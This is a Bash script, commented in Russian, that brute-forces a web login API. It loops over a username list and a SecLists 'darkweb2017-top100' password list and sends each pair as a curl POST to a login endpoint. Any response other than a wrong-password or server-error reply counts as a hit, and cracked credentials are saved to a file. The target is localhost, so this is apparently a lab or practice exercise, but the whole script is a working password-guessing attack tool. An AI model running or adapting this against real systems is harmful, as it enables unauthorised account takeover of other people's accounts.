#!/bin/bash

# Файл с именами пользователей
user_file="raw_user_list.txt"

# Файл с паролями
password_file="/usr/share/wordlists/seclists/Passwords/darkweb2017-top100.txt"

output_file="cracked_users.txt"

# Цикл по строкам файла с пользователями
while IFS= read -r username; do
  # Цикл по строкам файла с паролями для каждого пользователя
  while IFS= read -r password; do
    # Отправляем POST-запрос с текущими именем пользователя и паролем
    response=$(curl -sk -X 'POST' \
      'http://localhost/api/login' \
      -H 'accept: application/json' \
      -H 'Content-Type: application/json' \
      -d '{
      "username": "'"$username"'",
      "password": "'"$password"'"
    }')
    
    echo "Проверка пользователя: $username с паролем: $password"
    echo "Ответ сервера: $response"
    echo "-------------------------------"

    # Проверяем, есть ли в ответе ошибка "неверный пароль"
    if [[ "$response" != *'"detail":"неверный пароль"'* ]] && [[ "$response" != "Internal Server Error" ]]; then
        echo "Пароль найден для пользователя $username: $password"
        echo "Ответ сервера: $response"

        echo "Пользователь: $username, Пароль: $password" >> "$output_file"
        echo "Успешная комбинация добавлена в файл $output_file"
        
        break
    fi
  done < "$password_file"
done < "$user_file"

echo "Атака завершена."
exit 1
